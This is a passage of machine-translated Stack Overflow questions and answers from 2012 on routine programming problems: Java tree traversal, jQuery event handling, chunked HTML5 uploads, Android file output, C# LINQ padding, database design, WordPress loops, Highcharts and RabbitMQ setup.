    return result;
} 
```

我假设了一个与您的节点结构相似的节点结构。当然，如果您不以静态方式使用该方法，则该方法不必是静态的。

由于列表转换，此方法可能不是最有效的，但您不必担心任何数组大小。如果您确实需要该函数返回一个数组，只需将其包装到另一个函数中或让建议的函数返回一个数组（这将使得有必要在每次返回之前将列表转换为数组）。

关于您的代码，您遍历`i`以填充整个数组（无论您从哪里知道大小），但您始终将值设置为根节点的值。这就是为什么你总是有相同的价值。您的`makeArray`函数以递归方式调用自身，但它不执行任何操作（即使您添加了 sysout 语句；））

**更新：**

对于不使用列表的限制，这是另一个仅使用数组的版本：

```
int size = 20;
int[] results = new int[size];
extractValues(n, results, 0); 
```

使用方法定义：

```
private static int extractValues(Node n, int[] results, int index) {
    if (n.getLeft() != null) {
        index = extractValues(n.getLeft(), results, index);
    }

    if (n.getRight() != null) {
        index = extractValues(n.getRight(), results, index);
    }

    results[index] = n.getValue();

    return index + 1;
} 
```

请注意，结果将在`results`, 中。大小必须被假定为大于节点的数量，或者必须通过遍历树来计算，之前。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-13T23:53:08.287

这个怎么样：（您的递归不会对数组进行任何更改）

```
public int [] toBSTArray() {
    int size = 20; //ASSUMING THIS IS LESS THAN OR EQUAL TO NUMBER OF NODES IN THE TREE
    int [] BSTarray = new int [size];
    makeArray(root, 0, BSTarray);
    return BSTarray;
}

//helper method called by toBSTArray
public void makeArray(BinarySearchTreeNode node, int i, int [] BSTarray ) {
    if (node != null) {
        BSTarray[i] = root.getValue();   
        makeArray(node.getLeft(), 2*i+1, BSTarray);
        makeArray(node.getRight(), 2*i+2, BSTarray);
   }
} 
```

# javascript - 动态 div 的单击事件不起作用

> ID：13870121
> 
> 赞同：0
> 
> 时间：2012-12-13T23:05:49.880
> 
> 标签：javascript, jquery, html

我根据在文本框中输入的值创建了带有 Click Event 的 div。

[**这里有一个例子**](http://goo.gl/Clwcx)

当您打开页面并单击任何行时，您将收到警报。但是，当您更改文本框中的值（输入数字）并点击加载按钮时，行将根据输入的数字加载。

现在，当您单击任何行时，单击事件不起作用.....

非常感谢这方面的任何帮助............

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:10:22.530

您需要[实时](http://api.jquery.com/live/)功能。

```
$(".schoolselect").live("click", function() { 
```

见这里：http: [//jsfiddle.net/27Z3t/](http://jsfiddle.net/27Z3t/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:12:29.540

您的点击处理程序`$('.schoolselect')`仅在页面加载时附加一次。它不是一个[实时的 jQuery 事件](http://api.jquery.com/live/)，但该技术已被弃用，取而代之的是委托模型。

您可以附加一个代表来`$('#divHSSchoolResultTable')`处理点击；

```
$('#divHSSchoolResultTable').delegate('.schoolselect', 'click', function() { alert(); }); 
```

有关更多详细信息，请参阅[jQuery 委托](http://api.jquery.com/delegate/)。

# php - html5 块和 webworker 不上传任何东西

> ID：13870127
> 
> 赞同：0
> 
> 时间：2012-12-13T23:06:23.377
> 
> 标签：php, javascript, html, file, web-worker

我正在使用 html5 slice 和 webworker，但是当它进入 uploadFile 函数时，什么也没发生。什么都没有上传

```
<html>
    <head>
        <title>Upload Files using XMLHttpRequest</title>
        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.5/jquery.min.js"></script>     
    </head>

    <body>
        <form id="fileuploader" enctype="multipart/form-data" method="post" action="upload.php">
            <label for="fileToUpload">Select Files to Upload</label><br />

            <input type="file" name="fileToUpload[]" multiple="" id="fileToUpload" onchange="fileList();"/><br />

            <input type="button" onclick="sendRequest();" value="Upload" />

            <!-- a place for File Listing -->
            <div id="fileList">              
            </div>           
        </form>
    </body>
</html>

<script type="text/javascript">

    function sendRequest() {
    var worker = new Worker("fileupload.js");

    worker.onmessage = function(e) {
        alert(e.data);
    }

    var file = document.getElementById('fileToUpload');

    for(var i = 0; i < file.files.length; i++) { 
        worker.postMessage(file.files[i]);  
    }
} 
```

对于 fileupload.js

```
var file;
var p = true;

function uploadFile(blobFile, fileName, filePart, totalChunks) {         
    var xhr = new XMLHttpRequest();                
    xhr.open("POST", "upload.php"+"?"+"file="+fileName + filePart, true);

    xhr.onload = function(e) {
    };

    xhr.send(blobFile);
}   

function process() {
    var blob = file;
    var originalFileName = blob.name;
    var filePart = 0

    const BYTES_PER_CHUNK = 100 * 1024 * 1024; // 100MB chunk sizes.
    var realFileSize = blob.size;

    var start = 0;
    var end = BYTES_PER_CHUNK;

    totalChunks = Math.ceil(realFileSize / BYTES_PER_CHUNK);

    while( start < realFileSize ) {
        //self.postMessage(start);
        //self.postMessage("test");

        var chunk = blob.slice(start, end);

        uploadFile(chunk, originalFileName, filePart, totalChunks);

        filePart++;
        start = end;
        end = start + BYTES_PER_CHUNK;
    }
}

self.onmessage = function(e) {
    file = e.data;
    /*for (var j = 0; j < e.data.length; j++) {
        files.push(e.data[j]);
    }*/

    if (p) {
        process();
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:41:13.817

总结您的代码：

```
 if (!blob.webkitSlice && !blob.mozSlice) {
     var chunk = blob.mozSlice(start, end);
     // or: var chunk = blob.webkitSlice(start, end);
 } 
```

这是您从中获取该错误的行，很明显您需要在那里获取异常。

当然，对于这些浏览器的旧版本，您可能应该检查前缀函数。但是如果“特征”检测不匹配，您将需要使用普通函数 - 可能是因为那些供应商已经删除了前缀，或者代码在其他浏览器（Opera，IE）中执行。另请参阅[*浏览器兼容性：* MDN 上有关 slice() 实现的](https://developer.mozilla.org/en-US/docs/DOM/Blob#Notes_on_the_slice%28%29_implementations)注释。

所以，使用这个：

```
var slice = blob.webkitSlice || blob.mozSlice || blob.slice;
var chunk = slice.call(blob, start, end); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-18T12:56:31.933

这是一个完整的工作代码。

```
var file = [], p = true;
function upload(blobOrFile) {
 var xhr = new XMLHttpRequest();
 xhr.open('POST', '/server', false);
 xhr.onload = function(e) {
 };
 xhr.send(blobOrFile);
}

function process() {
 for (var j = 0; j <file.length; j++) {
  var blob = file[j];

  const BYTES_PER_CHUNK = 1024 * 1024;
  // 1MB chunk sizes.
  const SIZE = blob.size;

  var start = 0;
  var end = BYTES_PER_CHUNK;

  while (start < SIZE) {

   if ('mozSlice' in blob) {
    var chunk = blob.mozSlice(start, end);
   } else {
    var chunk = blob.webkitSlice(start, end);
   }

   upload(chunk);

   start = end;
   end = start + BYTES_PER_CHUNK;
  }
  p = ( j = file.length - 1) ? true : false;
  self.postMessage(blob.name + " Uploaded Succesfully");
 }
}

self.onmessage = function(e) {

for (var j = 0; j < e.data.length; j++)
  files.push(e.data[j]);

 if (p) {
  process()
 }

} 
```

# android - 在 android c++ 源中输出到文件

> ID：13870128
> 
> 赞同：0
> 
> 时间：2012-12-13T23:06:36.757
> 
> 标签：android, android-ndk, android-source, android-build

我已经设法从源代码编译 android 并安装在我的手机上。我可能应该从一开始就说我不是 C++ 开发人员，但我希望我能够弄清楚如何将变量中保存的数据输出到文件中。

经过一番谷歌搜索后，我想出了以下代码：

```
#include <iostream>
#include <fstream>
using namespace std;

ofstream myfile;
myfile.open ("/data/wav.raw");
myfile < mMixBuffer;
myfile.close();

frameworks/base/services/audioflinger/AudioFlinger.cpp: In member function 'virtual bool android::AudioFlinger::MixerThread::threadLoop()':
frameworks/base/services/audioflinger/AudioFlinger.cpp:1769: error: 'ofstream' was not declared in this scope
frameworks/base/services/audioflinger/AudioFlinger.cpp:1769: error: expected ';' before 'myfile'
frameworks/base/services/audioflinger/AudioFlinger.cpp:1770: error: 'myfile' was not declared in this scope 
```

在这不起作用之后，我尝试了再次给出编译错误：

```
int fd;
fd = ::open("/data/wav.raw",O_WRONLY | O_APPEND);
::write(fd,mMixBuffer,minBufferSize);
::close(fd);

frameworks/base/services/audioflinger/AudioFlinger.cpp: In member function 'virtual bool android::AudioFlinger::MixerThread::threadLoop()':
frameworks/base/services/audioflinger/AudioFlinger.cpp:1770: error: '::open' has not been declared
frameworks/base/services/audioflinger/AudioFlinger.cpp:1770: error: 'O_WRONLY' was not declared in this scope
frameworks/base/services/audioflinger/AudioFlinger.cpp:1770: error: 'O_APPEND' was not declared in this scope 
```

如果从上面不清楚，我正在尝试将变量的内容附加`mMixBuffer`到`minBufferSize`文件`/data/wav.raw`中。有谁知道我怎么能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T10:00:58.853

/data/ 目录不能修改。您将不会拥有相同的权限。试试 /mnt/sdcard（或）/data/data/。

# c# - 如何显示来自数据库的链接

> ID：13870129
> 
> 赞同：0
> 
> 时间：2012-12-13T23:06:49.003
> 
> 标签：c#, asp.net, linq, entity-framework

我有一个带有多行文本框的表单，它是一个描述。我想知道是否有办法做到这一点，以便如果我在该多行文本框中输入 www.anywebsiteintheworld.com 之类的网址以及其他文本，然后在描述中间的链接可点击的位置显示该信息？

现在我获取信息`textbox.Text.Trim()`并将其显示为 a`label.Text`并且它不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:13:07.263

您不能在普通的 HTML 文本框中执行此操作。您需要一个基于 JavaScript 的富文本编辑器，例如[CKEditor](http://ckeditor.com/)。

# c# - 如何使用扩展方法使集合成为“n”个元素？

> ID：13870133
> 
> 赞同：4
> 
> 时间：2012-12-13T23:07:00.820
> 
> 标签：c#, linq, extension-methods

所以，这是我的问题，我有一个给定的对象，它是一个 IEnumerable，并且我已经保证该集合总是最多有 4 个元素。现在，出于一个不重要的原因，我希望能够以某种优雅的方式“强制”集合包含 4 个元素（如果它有任何更少）。

我已经做了一些研究，最有说服力的候选者是 Zip，但它会在到达最短集合结束后停止压缩。

有没有办法在不制作我自己的扩展方法的情况下做到这一点？为了更好地解释我自己：

```
var list1 = new List<Dog> {
    new Dog { Name = "Puppy" }
}
var list2 = new List<Dog> {
    new Dog { Name = "Puppy1" },
    new Dog { Name = "Puppy2" },
    new Dog { Name = "Puppy3" },
    new Dog { Name = "Puppy4" },
}

var other1 = list1.ExtendToNElements(4).ToList();
//Now other1's first element is an instance of Dog with Name = "Puppy"
//And the following 3 elements are null, or have a Dog with no name
//I don't really care about that

var other2 = list2.ExtendToNElements(4).ToList();
//other2 is the same as list2, nothing got added. 
```

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:14:26.063

快速单线（应该算作“没有扩展方法的可行”）：

```
public static IEnumerable<TItem> Extend<TItem>(
            this IEnumerable<TItem> source, 
            int n)
{
    return source.Concat(Enumerable.Repeat(default(TItem), n))
                 .Take(n);
} 
```

由于`Repeat`需要显式计数，因此传入会`n`给出合理的上限。无论如何，这些元素都是按需生成的。使用`source.Count()`会强制执行`source`不理想的操作。

稍微过度设计和灵活的版本：

```
public static IEnumerable<TItem> Extend<TItem>(
            this IEnumerable<TItem> source, 
            int n, 
            Func<TItem> with) 
{
    return source.Concat(
        from i in Enumerable.Range(0, n) select with()
    ).Take(n);
}

public static IEnumerable<TItem> Extend<TItem>(
            this IEnumerable<TItem> source, 
            int n, 
            TItem with = default(TItem)) 
{
    return source.Extend(n, with: () => with);
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-13T23:11:32.353

您可以使用 MoreLinq 的 Pad 方法：[http](http://code.google.com/p/morelinq/) ://code.google.com/p/morelinq/ （NuGet：[http](http://www.nuget.org/packages/morelinq) ://www.nuget.org/packages/morelinq ）

这将附加类型的默认值（`null`在这种情况下）：

```
var other1 = list1.Pad(4).ToList(); 
```

或者，如果您想提供默认值：

```
var other1 = list1.Pad(4, "Puppy_null").ToList(); 
```

或者，如果你想拥有那些编号的小狗：

```
var other1 = list.Pad(4, (count) => "Puppy" + count).ToList(); 
```

`Pad`如果它的长度已经等于或大于您的焊盘大小，该方法将不会添加额外的条目。

`Pad`如果您想在不引入整个项目的情况下合并/调整它，这是具体的实现： [http ://code.google.com/p/morelinq/source/browse/MoreLinq/Pad.cs](http://code.google.com/p/morelinq/source/browse/MoreLinq/Pad.cs)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-13T23:17:12.797

```
 class Program
    {
        static void Main(string[] args)
        {
            List<string> list = new List<string>();
            list.Capacity = 4;
            var items = list.TakeOrDefault(4);

        }
    }

    public static class EnumerableExtensions
    {
        public static IEnumerable<T> TakeOrDefault<T>(this IEnumerable<T> enumerable, int length)
        {
            int count = 0;
            foreach (T element in enumerable)
            {
                if (count == length)
                    yield break;

                yield return element;
                count++;
            }
            while (count != length)
            {
                yield return default(T);
                count++;
            }
        }
    } 
```

# database - 如何将不同组的测量值存储在数据库表中？

> ID：13870137
> 
> 赞同：0
> 
> 时间：2012-12-13T23:07:21.660
> 
> 标签：database, database-design

这是一个关于在数据库中存储大量数据的难题。

假设我有一个充满机器的设施，每台机器都测量多个数量的时间序列。我将尝试用一个玩具示例进行解释。

`MachineA`测量四个温度和一个湿度。`MachineB`测量一个温度和五个电压。`MachineC`测量风速和风向。测量一直在自动进行。

每台机器同时进行所有自己的测量，但时间间隔和偏移量因机器而异。这意味着一行只能包含一台机器在一个时间戳上进行的测量。

实际上有两千台机器。这意味着为每台机器或机器类型使用单独的表是不切实际的。

一直在添加不同的机器。一组跨越所有可能测量的列是不切实际的，因为如果我添加一个`MachineD`带有咸度测量的列，我不会提前考虑咸度，我必须为此在一个非常大的表中添加一个新列一台机器使用。

典型查询：

*   过去 90 天的最高温度是多少`MachineA`？
*   `MachineB`过去 7 天的所有测量值是多少？
*   在所有有温度测量的机器中，昨天测量的最低温度是多少？
*   对于每台进行温度测量的机器，昨天测量的最低温度是多少？
*   哪些机器有咸味检测器在过去一年内也有测量值？
*   根据`MachineC`' 的风速和`MachineB`' 的温度，风寒是多少？

在这些限制条件下如何组织？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:36:27.567

这个数据有几个*维度*

*   机器（位置？）：产生测量的东西
*   “分析物”：被测量的东西
*   （显然）时间：测量的时间。

这三个项目，以某种形式，*必须是*主键的一部分。唯一的功能依赖属性是 *measurement"：测量过程的实际结果。它的单位并不重要（因为它在功能上也依赖于三个关键字段；尽管*可能*有一个额外的伪维度“设备类型”，或者它甚至可能取决于位置。甚至时间。叹息......）。

在像这样的现实世界问题中，总是存在隐藏的依赖关系：位置 X**只**测量{温度、风速、湿度}，并且**总是**使用测量设备 Y。

这就是 BCNF 发挥作用的地方。不知道你的数据，我不能说。如果我*确实*知道您的数据，我也无法判断：3..4 个关键元素之间的依赖关系可能会随着时间而改变。

# php - 插入 在 php 循环的一个实例中

> ID：13870141
> 
> 赞同：2
> 
> 时间：2012-12-13T23:07:39.103
> 
> 标签：php, wordpress, loops, while-loop

我网站主页上的内容显示在一个框中，左侧是文章，右侧是该类别中的其他文章。wordpress 主页索引设置为在第一个下方创建另一个框，依此类推，对于我希望显示的每个类别。

我想在第一个内容框之后插入一个用于视频缩略图的小 div 部分，然后允许 wordpress 返回到在其下方发布其他内容框。我只是在学习 php，并且遇到了麻烦。

我已经在循环中的适当位置添加了 div，但是如何将其隔离为仅出现在第一个内容框（$cat1）下，而不是所有内容框下？

我试过

```
<?php while($cat1);{
echo '<div id="video"></div>'}
?> 
```

但我只是不确定，任何帮助将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:23:16.067

您只需设置一个简单的计数器来处理此问题，因为您知道必须在循环的哪个迭代中添加视频部分 - 第一个。

在循环将变量初始化为计数器之前，将其设置为零。在您的循环中，您检查计数器是否为零，如果是，则插入您的视频代码。然后将计数器加 1，视频将不再显示。

```
<?php $count = 0 ?>

<?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>

    // Your normal loop stuff here

    <?php
    if ($count == 0 ) {

        echo '<div id="video"></div>';

    }

    $count++;
    ?>

<?php endwhile; endif: ?> 
```

# android - 当我在 ExpandableListView 的 Children 组中单击 EditText 时，会出现键盘，但如果我在其上键入 EditText 不会更新

> ID：13870142
> 
> 赞同：2
> 
> 时间：2012-12-13T23:07:40.193
> 
> 标签：android, android-widget

我有一个可以与 JSONObject 一起正常工作的 ExpandableListView。当我单击组时，会显示孩子。孩子代表评论，在我的例子中，最后一个孩子是 EditText。通过这个 EditText 我可以插入一个新的评论。问题是这样的：

如果在我的适配器中我使用 myEditText.requestFocus() 键盘可以工作，我的意思是当我输入它时，editText 会更新字符，但通常我必须在 EditText 上多次按下才能看到键盘。如果在我的适配器中我不使用 myEditText.requestFocus()，当我单击 EditText 时，我可以快速看到键盘（通常当您单击 EditText 时键盘会出现），但是如果我键入，editText 不会更新，我的意思是我在小部件中看不到任何字符。要查看字符，我必须在打开键盘时再单击一次 EditText。

这是我用于评论的布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
   android:id="@+id/layoutchildren"
   android:layout_height="wrap_content" 
   android:layout_width="fill_parent" 
   android:orientation="vertical" 
   android:paddingLeft="10dip"
   android:paddingLeft="10dip"
   android:background="@color/lgray">
    <RelativeLayout  android:paddingLeft="10dip" android:paddingRight="10dip" android:background="@color/white" android:layout_height="45dip" android:layout_width="fill_parent" android:layout_marginBottom="2dip" >

    <ImageView android:id="@+id/feedcommentcell_profileimg" android:layout_width="32dip" android:layout_height="32dip" android:layout_centerVertical="true" android:scaleType="fitXY"/>
    <TextView android:id="@+id/feedcommentcell_username" android:textStyle="bold" android:layout_width="wrap_content" android:layout_height="wrap_content" android:textSize="13sp" android:textColor="@color/black" android:layout_toRightOf="@+id/feedcommentcell_profileimg" android:layout_marginLeft="10dip" android:layout_alignTop="@+id/feedcommentcell_profileimg"/>
    <TextView android:id="@+id/feedcommentcell_comment" android:layout_width="wrap_content" android:layout_height="wrap_content" android:textSize="11sp" android:textColor="@color/black" android:layout_toRightOf="@+id/feedcommentcell_profileimg" android:layout_marginLeft="10dip" android:layout_below="@+id/feedcommentcell_username"/>
    <TextView android:id="@+id/feedcommentcell_scanhour" android:layout_width="wrap_content" android:layout_height="wrap_content" android:textSize="10sp" android:textColor="@color/dgray" android:layout_alignParentRight="true" android:layout_alignBottom="@+id/feedcommentcell_username"/>
    </RelativeLayout>

</LinearLayout> 
```

这是我的 EditText 的布局

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
   android:layout_height="wrap_content"
   android:layout_width="fill_parent" 
   android:orientation="vertical" 
   android:paddingLeft="10dip"
   android:paddingRight="10dip"
   android:background="@color/lgray">
<RelativeLayout android:id="@+id/feedcell_addcomment" android:paddingLeft="10dip" android:paddingRight="10dip" android:paddingTop="5dip" android:paddingBottom="5dip" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="0.5dip" android:background="@color/mlgray">
         <EditText android:id="@+id/feedcell_edittxt" android:textColor="@color/black" android:layout_width="fill_parent" android:hint="Write a comment.." android:layout_height="35dip"   android:textSize="14sp" android:gravity="center_vertical" android:paddingLeft="10dip" android:background="@drawable/bgfriendsedtxt" android:singleLine="true" android:clickable="true"/>
         <Button android:id="@+id/feedcell_commentbtn" android:textColor="@color/black" android:textSize="14sp" android:layout_height="32dip" android:layout_width="60dip" android:text="Done"  android:layout_alignParentRight="true" android:layout_marginTop="4dip" android:layout_marginRight="5dip" android:gravity="center"/>
    </RelativeLayout>
</LinearLayout> 
```

这是我的适配器中的 getChildView：

```
@Override
        public View getChildView(int groupPosition, int childPosition, boolean isLastChild, View convertView, ViewGroup parent)
    {

        View v = convertView;
    int type=getChildType(groupPosition,childPosition);
    LayoutInflater vi = (LayoutInflater)getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        if (v == null)
        {
            switch(type)
        {

            case TYPE_EDIT:

                v = vi.inflate(R.layout.edittextcommentlist,null);
                break;

            case TYPE_CHILD:

                    v = vi.inflate(R.layout.feedcommentcell,null);
                    break;

        }

        }  
        try
        { 
            if(type == TYPE_CHILD)
            {
                final JSONObject o = getChild(groupPosition,childPosition);

                if(o!=null)
                {
                         //I fill out my Children XML file 
                         }

            }
            else if(type==TYPE_EDIT)
            {
                JSONObject o = getChild(groupPosition,childPosition);
                if(o!=null)
                {

                    final int groupPos=groupPosition;

        addComment =   (EditText)v.findViewById(R.id.feedcell_edittxt);        

                   addComment.requestFocus();

            addComment.setOnClickListener(new OnClickListener(){

        @Override
    public void onClick(View v) {

        addComment.setText("");
                }
                });

            //addComment.requestFocus();

            commentBtn=(Button)v.findViewById(R.id.feedcell_commentbtn);
                commentBtn.setOnClickListener(new OnClickListener(){

                @Override
                public void onClick(View v) {

                    //I write my code for button..ok
                            }

                        });

                }

            }

        }
        catch(Exception e)
        {}
        return v;
    } 
```

我找到了很多关于这个话题的答案，但我试图改变 android manifest 上的键盘状态，我试图实现 onFocusChange，我试图在 xml 文件中添加或通过 java 代码属性 android:focusable 和 android:focusableInTouchMode 。 ... 我注意到，如果我不使用 addComment.requestFocus()，当我单击 EditText 时，键盘会快速打开，但 Done 按钮会在 1 秒后转动并变为 return .. 总之我尝试了很多方法，但我可以不解决问题。有人能帮我吗？谢谢

# highcharts - 在 Highcharts 组合图表（线和柱）中，tu column serie 是否可能是主要的？

> ID：13870143
> 
> 赞同：0
> 
> 时间：2012-12-13T23:07:50.003
> 
> 标签：highcharts

我有一个组合图表（线和柱）。线性系列的每个点都有标签，但是，我需要标签在列系列的下方。这可能吗？

```
 series: [{
            name: 'Tokyo',
            data: [7.0, 6.9, 9.5, 14.5, 18.2],
            pointPlacement : 'on'
        },  {
            type : 'column',
            name: 'London',
            data: [3.9, 4.2, 5.7, 8.5, 11.9],
            pointPlacement : 'between'
        }] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-01T11:55:45.293

如果您的意思是数据标签，则不支持将它们设置在底部（您可以在此处投票支持此选项：http: [//highcharts.uservoice.com/forums/55896-general/suggestions/2660291-datalabel-inside-column-option](http://highcharts.uservoice.com/forums/55896-general/suggestions/2660291-datalabel-inside-column-option) )，但您可以使用小的解决方法：

[http://jsfiddle.net/W9ZUQ/6/](http://jsfiddle.net/W9ZUQ/6/)

```
chart: {
    renderTo: 'container',
    events: {
        load: function() {
            var series = this.series,
                s1 = series[1].data,
                i = 0,
                l = s1.length;
            for (; i < l; i++) { 
                s1[i].dataLabel.attr('y', 290);
            }
        }
    }
}, 
```

# php - 从 PHP 连接到 RabbitMQ 所需的安装

> ID：13870147
> 
> 赞同：0
> 
> 时间：2012-12-13T23:08:43.230
> 
> 标签：php, rabbitmq, ubuntu-12.04

我有一个 Ubuntu 12 服务器正在运行，我需要在其上运行一些 PHP 代码以连接到 RabbitMQ（在另一台服务器上运行 - Windows）需要什么？如果我去 Ubuntu 终端并运行：“which amqp”它什么也不返回，但如果我这样做：“pecl install amqp”我得到：“pecl/amqp 已经安装并且与发布的版本 1.0.9 相同”

我做错什么了？如何安装 amqp 和随后的 librabbitmq 客户端库？

谢谢杰克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:13:48.360

来自google搜索结果的第一页：http: [//blog.webgen.hu/rabbitmq-for-php-on-ubuntu/](http://blog.webgen.hu/rabbitmq-for-php-on-ubuntu/)

他们在 ubuntu 上安装了完整的服务器，但您不必在安装后使用它，而且一旦您开始工作，您就可以随时进行精简。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T18:40:12.323

Amqp 不是一个命令行程序，它是一个访问 RabbitMQ 的库，所以`which amqp`不会给你任何东西。

如果您安装了 pecl/amqp 扩展，那么您需要在 PHP 代码中使用它。

见[http://php.net/manual/en/book.amqp.php](http://php.net/manual/en/book.amqp.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-20T16:37:07.783

有一个 AMQP 原生 PHP 和一个 C 库 + PHP 模块实现，可用于连接到 RabbitMQ。与 python 和 C# 相比，它们都非常慢，因为它们不使用连接池。PHP 实现当然是最差的。

我使用 Unix 套接字解决了性能问题，将消息发送到 python 进程，将它们写入 rabbitmq。完美运行 - 通过负载测试批准

干杯

# javascript - 单击父 div 时模拟单击

> ID：13870148
> 
> 赞同：0
> 
> 时间：2012-12-13T23:08:46.043
> 
> 标签：javascript, jquery

我正在尝试使用 jquery 在单击`<a>`父 div 时触发对标记的单击

对于这个结构

```
<div id="menu_container">

                <ul id="header_links_container">

                    <li class="header_link header_link_large border_box_1">
                        <a class="header_link" href="http://amazon.com">LINK 1</a>
                    </li>

                    <li class="header_link border_box_1">
                        <a class="header_link" href="http://google.com">LINK 2</a>
                    </li>

                    <div class="tbc"></div>

                </ul>

            </div> 
```

使用这个

```
$('#menu_container').on('click', 'li.header_link', function(){
    console.log($(this));
    $(this).children('a.header_link').click();  
}); 
```

产生和无限量的点击。我猜是因为当我触发`<a>`标签上的 click() 时，它的父 div 也会收到一次点击，所以它只是再次执行所有操作。

当单击父 div 时，如何模拟对锚点的单击？尝试使用[此 SO 帖子](https://stackoverflow.com/a/9537518/1252748)中的答案是行不通的。

[jsbin 示例](http://jsbin.com/ucatir/1/edit)

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:14:29.733

您**不能触发**Anchor 的单击事件，以便您可以转到该特定源。

您需要明确单击它以使其以您期望的方式工作。

您可以尝试的最佳选择是使用`window.location`

试试这个

```
$('#menu_container').on('click', 'li.header_link', function(e){
   console.log('clicked');
   var loc = $(this).find("a.header_link").attr('href');
   window.location = loc;
}); 
```

这将不起作用，`jsBin`因为它试图停止重定向。在你的本地机器上试一试​</p>

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-14T00:30:03.117

您可以使用[Elements click 方法](https://developer.mozilla.org/en-US/docs/DOM/element.click)而不是 jQuery 的。

```
$('#menu_container').on('click', 'li.header_link', function(){
   console.log('clicked');
   $(this).find("a.header_link").get(0).click();
}); 
```

[您也应该按照@Sushanth](https://stackoverflow.com/users/941272/sushanth)的建议在您的计算机上尝试它。

# javascript - 确保仅在所有 PHP 完全执行后才执行 jQuery

> ID：13870151
> 
> 赞同：2
> 
> 时间：2012-12-13T23:08:53.667
> 
> 标签：javascript, jquery, onload, image-loading

我有一些与一些外部 PHP 一起工作的 jQuery 代码，但通常只有在第二次刷新之后。该代码旨在**获取列表中每个图像的尺寸**，**然后根据其最长边重新设置每个图像的样式**以适合其父级。第一次加载此页面时，jQuery 似乎无法确定所有图像的高度和宽度，因此忽略了样式。**确保在从 PHP 调用的图像完全加载后执行 jQuery 的最佳方法是什么？**

*场景：* 我有一个使用外部 PHP 脚本调用图像列表的页面。PHP 运行后，结果会在 id 为“txtHint”的 div 中以 HTML 形式回显。

所以这个PHP（为了相关性而被截断）......

```
echo "<li><img src='images/".$rowcat['imageurl']. "'><div class='title'>" . $counter . ". " . $rowcat['name'] ."</div></li>";                       
    $counter++; 
```

回显到此“txtHint” div 中：

```
<div class="featured-scroller">
<ul>
    <div id="txtHint">
            <li><img src="images/012.jpg"><div class="title">1\. Eyemouth Museum </div></li>
            <li><img src="images/014.jpg"><div class="title">2\. Edinburgh Museum</div></li>
            // and so on...
    </div>
</ul>
</div> 
```

但是，一旦返回结果，我需要检查每个图像实例的尺寸，并根据宽度或高度是否较长来设置样式，同时还要保持其原始纵横比。

目前，我正在使用以下 jQuery：

```
$("#txtHint img").each(function() {
    var imgHeight = $(this).height();
    var imgWidth = $(this).width();

    if(imgHeight > imgWidth)
        {
            $(this).css({'height':'100%', 'width':'auto'});
        }
    else
        {
            $(this).css({'height':'auto', 'width':'100%', 'position':'relative', 'top':'50%', 'margin-top': -imgHeight / 2 + 'px', 'display':'inline-block'});
        }
}); 
```

应该提到的是，外部 PHP 脚本是从页面头部的 JavaScript 中调用的。我不确定这是否会有所不同。

当前代码有效，但不是第一次。我试过 $(window).load 等，以及在提到的调用 PHP 脚本的 JavaScript 中调用它，但问题仍然存在。

有关工作示例，请参见以下 JSfiddle：http: [//jsfiddle.net/EMPqW/](http://jsfiddle.net/EMPqW/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:16:54.660

你的问题有点令人困惑。据我了解，您在这里真正要问的是如何确保加载图像以准确计算其尺寸。

PHP 代码无关紧要，因为 PHP 总是在 JavaScript 之前被解释。服务器将输出 HTML，JS 会看到，但不会看到原始的 PHP。这就是服务器-客户端模型的工作原理。

为了确保在操作图像之前加载图像，您可以使用对象的`load`事件`window`。

```
$(window).load(function(){ //images were loaded }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:13:47.900

你试过了吗

```
$(document).ready(function(){
//your code here
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-13T23:46:51.190

在使用加载事件之前，这是您需要的，请确保您正在运行最新版本的 jquery。早期版本在不同的浏览器中没有很好地实现它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-13T23:16:03.180

如果您想确保所有图像都已加载，您可以使用该`.load()`事件：

```
$(window).load(function() {
    // document and images should have loaded by now.
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-13T23:22:16.900

通常，如果您需要检查图像是否已完全加载（在 javascript 中渲染图像 src 时通常需要，但在您的情况下看起来也需要）以及其他任何无济于事的事情，您可能希望在处理`load()`图像之前将处理程序放在图像上，这里是演示：

```
$("#txtHint img").each(function() {
    $t = $(this);

    function image_process() {
        var imgHeight = $t.height();
        var imgWidth = $t.width();

        if (imgHeight > imgWidth) {
            $t.css({
                'height': '100%',
                'width': 'auto'
            });
        }
        else {
            $t.css({
                'height': 'auto',
                'width': '100%',
                'position': 'relative',
                'top': '50%',
                'margin-top': -imgHeight / 2 + 'px',
                'display': 'inline-block'
            });
        }
    }
    if (this.complete) {
        image_process()
    } else {
        $t.one('load',image_process);
    }
